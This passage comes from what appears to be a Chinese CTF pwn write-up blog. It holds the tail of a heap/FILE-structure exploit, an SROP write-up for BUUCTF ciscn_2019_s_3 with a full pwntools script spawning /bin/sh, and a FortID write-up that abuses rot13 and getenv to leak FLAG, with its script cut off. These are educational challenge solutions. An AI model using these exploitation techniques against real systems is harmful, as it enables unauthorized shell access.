class="hljs-number">1</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(_chain)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">13</span>+p64(vtable)<br><br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x400</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">16</span>+<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+p64(<span class="hljs-number">0x61</span>)+p64(<span class="hljs-number">0</span>)+p64(IO_list_all-<span class="hljs-number">0x10</span>)+fakeFILE+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(sysAddr)<br>UpgradeHouse(<span class="hljs-built_in">len</span>(payload),payload)<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;Your choice : &quot;</span>)<br>ioTube.send(<span class="hljs-string">&quot;1&quot;</span>)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>Heap</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>UAF:level1-level3</title>
    <link href="/2025/09/23/pwn.college/Program-Securtity/Heap/UAF-level1-level3/"/>
    <url>/2025/09/23/pwn.college/Program-Securtity/Heap/UAF-level1-level3/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>Program-Security</category>
      
      <category>ROP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SROP-for-BUUCTF-ciscn-2019-s-3</title>
    <link href="/2025/09/15/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/SROP/SROP-for-BUUCTF-ciscn-2019-s-3/"/>
    <url>/2025/09/15/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/SROP/SROP-for-BUUCTF-ciscn-2019-s-3/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>题目背景和初步分析见：<a href="https://0x4a-210.github.io/2025/08/05/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2csu/ret2csu-for-BUUCTF-ciscn-2019-s-3/">ret2csu-for-BUUCTF-ciscn-2019-s-3</a><br></p><span id="more"></span><p>在上述文章中已经分析过了这题ret2csu的解法，这里再记录另一种更简洁的解法：SROP</p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>由于checksec和溢出点寻找、地址泄露等在ret2csu的那篇文章已经分析过了，这里不再赘述<br><br>我们直接从gadgets函数看起，除了上述文章提到的mov rax,0x3b指令，还可以看到gadgets里有mov rax,0xf的指令，如下图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/SROP/mov_rax_15.png"><br>从<a href="https://0x4a-210.github.io/2025/07/19/TogetherReview/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%BB%E7%BB%93/">二进制总结</a>这篇文章中，我们可以得知15恰好是sigreturn系统调用的调用号，因此可以想到使用SROP的方法<br><br>综上，通过SROP进行利用的思路为：溢出buf，将返回地址劫持到mov rax,15处，然后执行syscall，开启sigreturn系统调用，再利用伪造的Signal Frame开启execve(“&#x2F;bin&#x2F;sh”,0,0)</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>SROP关键点在于伪造Signal Frame，其中主要的是rdi，rsi，rdx和rip这几个寄存器<br><br>一般来说rsi和rdx很好确定，作为execve的第2和第3个参数，直接填入0<br><br>rip寄存器是sigreturn会回到的指令地址，由于这题是no-PIE的，通过ROPgadget寻找syscall这个gadgets，填入其地址即可，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/SROP/syscall-gadget.png"><br>最后，最重要的是rdi寄存器，该寄存器需要保存&#x2F;bin&#x2F;sh字符串的地址，但程序本身没有该字符串，需要我们自己输入<br><br>本题中我选择将其输入到buf开始的地方，然后根据泄露地址减去偏移，把buf首地址填入rdi<br><br>最后，需要根据上述寄存器的要求伪造Signal Frame，这是一件比较麻烦的事情，幸好pwntools提供了名为SigreturnFrame的类，只要指定相应的寄存器成员变量即可，其他无用寄存器会被初始化为0，不用管它<br><br>综上，最后的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>elf=ELF(targetELF)<br>LOCAL=<span class="hljs-number">1</span><br>REMOTE=<span class="hljs-number">2</span><br>DEBUG=<span class="hljs-number">3</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Lauch</span>(<span class="hljs-params">mode=LOCAL</span>):<br>    <span class="hljs-keyword">if</span> mode==LOCAL:<br>        io=process(targetELF)<br>    <span class="hljs-keyword">elif</span> mode==REMOTE:<br>        io=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">28056</span>)<br>    <span class="hljs-keyword">elif</span> mode==DEBUG:<br>        io=gdb.debug(targetELF,<span class="hljs-string">&quot;b *0x400501&quot;</span>)<br>    <span class="hljs-keyword">return</span> io<br><br>ioTube=Lauch(REMOTE)<br>offset=<span class="hljs-number">0x10</span><br>mov_rax_15_ret=<span class="hljs-number">0x4004da</span><br>syscallAddr=<span class="hljs-number">0x400501</span><br>backAddr=elf.symbols[<span class="hljs-string">&quot;vuln&quot;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">LeakStack</span>(<span class="hljs-params">io</span>):<br>    payload=<span class="hljs-string">b&#x27;A&#x27;</span>*offset+p64(backAddr)<br>    io.send(payload)<br>    io.recv(<span class="hljs-number">0x20</span>)<br>    leak=u64(io.recv(<span class="hljs-number">0x10</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">return</span> leak<br><br>fakeSigFrame=SigreturnFrame()<br>fakeSigFrame.rax=<span class="hljs-number">59</span><br>fakeSigFrame.rsi=<span class="hljs-number">0</span><br>fakeSigFrame.rdx=<span class="hljs-number">0</span><br>fakeSigFrame.rip=syscallAddr<br><br>stackAddr=LeakStack(ioTube)<br><span class="hljs-comment"># fakeSigFrame.rsp=stackAddr-0x118+offset+16</span><br><br>binshAddr=stackAddr-<span class="hljs-number">0x118</span><br>fakeSigFrame.rdi=binshAddr<br><br>payload=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+<span class="hljs-string">b&#x27;A&#x27;</span>*(offset-<span class="hljs-built_in">len</span>(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))+p64(mov_rax_15_ret)+p64(syscallAddr)+<span class="hljs-built_in">bytes</span>(fakeSigFrame)<br>ioTube.send(payload)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>ROP</category>
      
      <category>SROP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025-09-13-FortID-ProtectEnvironment</title>
    <link href="/2025/09/15/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-13-FortID-ProtectEnvironment/"/>
    <url>/2025/09/15/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-13-FortID-ProtectEnvironment/</url>
    
    <content type="html"><![CDATA[<hr><h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道关于环境变量的利用题目，和一般的堆栈利用不太一样<br></p><span id="more"></span><p>由于比赛结束以后看不到题目了，因此就不放原题链接了…………</p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>这道题目给了一份源代码，一个二进制文件以及一个libc-2.27的so文件<br><br>那于是直接看源码：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// gcc -o chall chall.c</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">rot13</span><span class="hljs-params">(<span class="hljs-type">char</span> *s)</span> &#123;<br>  <span class="hljs-keyword">while</span> (*s != <span class="hljs-number">0</span>) &#123;<br>    *s += <span class="hljs-number">13</span>;<br>    s++;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>  <span class="hljs-type">char</span> command[<span class="hljs-number">64</span>];<br>  <span class="hljs-type">char</span> name[<span class="hljs-number">64</span>];<br><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%63s %63s&quot;</span>, command, name);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(command, <span class="hljs-string">&quot;protect&quot;</span>)) <br>    &#123;<br>      <span class="hljs-type">char</span> *val = getenv(name);<br>      <span class="hljs-keyword">if</span> (val) <br>      &#123;<br>        rot13(val);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Protected %s\n&quot;</span>, name);<br>      &#125; <br>      <span class="hljs-keyword">else</span> <br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No such environment variable\n&quot;</span>);<br>      &#125;<br>    &#125; <br><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(command, <span class="hljs-string">&quot;print&quot;</span>)) <br>    &#123;<br>      <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;FLAG&quot;</span>)) <br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Access denied\n&quot;</span>);<br>      &#125; <br>      <span class="hljs-keyword">else</span> <br>      &#123;<br>        <span class="hljs-type">char</span> *val = getenv(name);<br>        <span class="hljs-keyword">if</span> (val) <br>        &#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s=%s\n&quot;</span>, name, val);<br>        &#125; <br>        <span class="hljs-keyword">else</span> <br>        &#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No such environment variable\n&quot;</span>);<br>        &#125;<br>      &#125;<br>    &#125; <br><br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unknown command\n&quot;</span>);<br>      <span class="hljs-keyword">break</span> ;<br>    &#125;<br>  &#125; <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>源码还是比较简单易懂的，大概就是模拟了一个命令解释器，只有两个指令，protect会对指定的环境变量进行每个字符+13的加密操作，print会输出环境变量的值，但会检查如果是FLAG则拒绝输出<br><br>乍一看上去无从下手，只能耐心一点点分析<br><br>首先按照常规思路，先checksec看一下保护，，发现全开，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-13-FortID-ProtectEnvironment/checksec.png"><br>于是放弃溢出的想法，而且粗略看下来也没有很明显的溢出点（可控输入63字节小于缓冲区大小，也没有memcpy这种危险函数）<br><br>然后我考虑是否能绕过strcmp的比较逻辑，但是上网搜了下strcmp的具体行为，结合glibc-2.27源码，如下：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> STRCMP</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> STRCMP strcmp</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">/* Compare S1 and S2, returning less than, equal to or</span><br><span class="hljs-comment">   greater than zero if S1 is lexicographically less than,</span><br><span class="hljs-comment">   equal to or greater than S2.  */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">STRCMP</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *p1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *p2)</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *s1 = (<span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) p1;<br>  <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *s2 = (<span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) p2;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> c1, c2;<br><br>  <span class="hljs-keyword">do</span><br>    &#123;<br>      c1 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) *s1++;<br>      c2 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) *s2++;<br>      <span class="hljs-keyword">if</span> (c1 == <span class="hljs-string">&#x27;\0&#x27;</span>) <span class="hljs-keyword">return</span> c1 - c2;<br>    &#125;<br>  <span class="hljs-keyword">while</span> (c1 == c2);<br><br>  <span class="hljs-keyword">return</span> c1 - c2;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析发现，strcmp会逐个字符比较，直到遇到0字节，看起来在这道题里没有可以利用的地方<br><br>之后尝试能否在scanf的时候做手脚，比如分批次输入（先输入111G，然后输出FLA这种），但是动态调试发现，scanf最后会在输入的末尾添加0x00，如下图：<br><br>首先在scanf处打断点，输入protect 11111111，然后根据反汇编结果容易得出name数组起始地址在rbp下方0x50个字节处，查看该处内存：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-13-FortID-ProtectEnvironment/gdb-scanf1.png"><br>之后再次断在scanf这里，这次输入protect 11111，然后再次查看$rbp-0x50：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-13-FortID-ProtectEnvironment/gdb-scanf2.png"><br>因此可以确定我们输入的是什么字符串，strcmp里面就会比较什么，这里绕不过去<br><br>接下来只能想：能不能输入的不是FLAG这四个字母，但是最后getenv返回的是FLAG变量（或者其有限次rot13的结果）呢？<br><br>于是需要深入了解getenv的行为，因此仔细研究了一下glibc2.27的源代码，如下：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Return the value of the environment variable NAME.  This implementation</span><br><span class="hljs-comment">   is tuned a bit in that it assumes no environment variable has an empty</span><br><span class="hljs-comment">   name which of course should always be true.  We have a special case for</span><br><span class="hljs-comment">   one character names so that for the general case we can assume at least</span><br><span class="hljs-comment">   two characters which we can access.  By doing this we can avoid using the</span><br><span class="hljs-comment">   `strncmp&#x27; most of the time.  */</span><br><span class="hljs-type">char</span> * <span class="hljs-title function_">getenv</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> len = <span class="hljs-built_in">strlen</span> (name);<br>  <span class="hljs-type">char</span> **ep;<br>  <span class="hljs-type">uint16_t</span> name_start;<br><br>  <span class="hljs-keyword">if</span> (__environ == <span class="hljs-literal">NULL</span> || name[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-keyword">if</span> (name[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>    &#123;<br>      <span class="hljs-comment">/* The name of the variable consists of only one character.  Therefore</span><br><span class="hljs-comment"> the first two characters of the environment entry are this character</span><br><span class="hljs-comment"> and a &#x27;=&#x27; character.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> __BYTE_ORDER == __LITTLE_ENDIAN || !_STRING_ARCH_unaligned</span><br>      name_start = (<span class="hljs-string">&#x27;=&#x27;</span> &lt;&lt; <span class="hljs-number">8</span>) | *(<span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) name;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>      name_start = <span class="hljs-string">&#x27;=&#x27;</span> | ((*(<span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) name) &lt;&lt; <span class="hljs-number">8</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      <span class="hljs-keyword">for</span> (ep = __environ; *ep != <span class="hljs-literal">NULL</span>; ++ep)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _STRING_ARCH_unaligned</span><br>  <span class="hljs-type">uint16_t</span> ep_start = *(<span class="hljs-type">uint16_t</span> *) *ep;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">uint16_t</span> ep_start = (((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) *ep)[<span class="hljs-number">0</span>]<br>       | (((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) *ep)[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">8</span>));<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (name_start == ep_start)<br>    <span class="hljs-keyword">return</span> &amp;(*ep)[<span class="hljs-number">2</span>];<br>&#125;<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _STRING_ARCH_unaligned</span><br>      name_start = *(<span class="hljs-type">const</span> <span class="hljs-type">uint16_t</span> *) name;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>      name_start = (((<span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) name)[<span class="hljs-number">0</span>]<br>    | (((<span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) name)[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">8</span>));<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      len -= <span class="hljs-number">2</span>;<br>      name += <span class="hljs-number">2</span>;<br><br>      <span class="hljs-keyword">for</span> (ep = __environ; *ep != <span class="hljs-literal">NULL</span>; ++ep)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _STRING_ARCH_unaligned</span><br>  <span class="hljs-type">uint16_t</span> ep_start = *(<span class="hljs-type">uint16_t</span> *) *ep;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">uint16_t</span> ep_start = (((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) *ep)[<span class="hljs-number">0</span>]<br>       | (((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) *ep)[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">8</span>));<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (name_start == ep_start &amp;&amp; !<span class="hljs-built_in">strncmp</span> (*ep + <span class="hljs-number">2</span>, name, len)<br>      &amp;&amp; (*ep)[len + <span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;=&#x27;</span>)<br>    <span class="hljs-keyword">return</span> &amp;(*ep)[len + <span class="hljs-number">3</span>];<br>&#125;<br>    &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>glibc的源码看起来还是比较晦涩的，结合注释，这个函数看下来大概就是：对于传入的name是NULL的，直接返回NULL（对应第5行的if语句）<br><br>对于name是单个字符的单独处理，这跟题目没什么关系，因此主要看多个字节的<br><br>可以看到，getenv会首先初始化一个2字节指针，遍历environ数组时先比较前两个字节是否匹配，匹配之后，会一口气比较剩余部分以及name的后一个是否是’&#x3D;’，如下所示：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (name_start == ep_start &amp;&amp; !<span class="hljs-built_in">strncmp</span> (*ep + <span class="hljs-number">2</span>, name, len)<br>      &amp;&amp; (*ep)[len + <span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;=&#x27;</span>)<br></code></pre></td></tr></table></figure><p>于是这里就有一个可以利用的地方：由于getenv仅匹配’&#x3D;’，因此可以通过不断地rot13让某个字符变成’&#x3D;’，由于ASCII字符仅一个字节，通过溢出256的方式这很容易实现；<br><br>但具体让哪个字符溢出为’&#x3D;’呢？由于对于flag我们已知的前缀为FortID{，而经过计算，正好F的ASCII码可以经过整数次的+13操作变成’&#x3D;’，因此最终的exp如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>libcPath=<span class="hljs-string">&quot;./libc-2.27.so&quot;</span><br>LOCAL=<span class="hljs-number">1</span><br>REMOTE=<span class="hljs-number">2</span><br>DEBUG=<span class="hljs-number">3</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Lauch</span>(<span class="hljs-params">mode=LOCAL</span>):<br>    <span class="hljs-keyword">if</span> mode==LOCAL:<br>        io=process(targetELF)<br>    <span class="hljs-keyword">elif</span> mode==REMOTE:<br>        io=remote(<span class="hljs-string">&quot;0.cloud.chals.io&quot;</span>,<span class="hljs-number">33121</span>)<br>    <span class="hljs-keyword">elif</span> mode==DEBUG:<br>        io=gdb.debug(targetELF,<span class="hljs-string">&quot;b *main+303&quot;</span>)<br>    <span class="hljs-keyword">return</span> io<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Decrypt</span>(<span class="hljs-params">character_,k</span>):<br>    cipher=<span class="hljs-built_in">ord</span>(character_)<br>    plain=<span class="hljs-number">0</span><br>    overFlow=<span class="hljs-number">256</span>+cipher<br>    plain=overFlow-k*<span class="hljs-number">13</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">chr</span>(plain)<br><br>ioTube=Lauch(REMOTE)<br>rotTimes=(<span class="hljs-number">317</span>-<span class="hljs-number">70</span>)//<span class="hljs-number">13</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,rotTimes):<br>    ioTube.recvuntil(<span class="hljs-string">&quot;&gt; 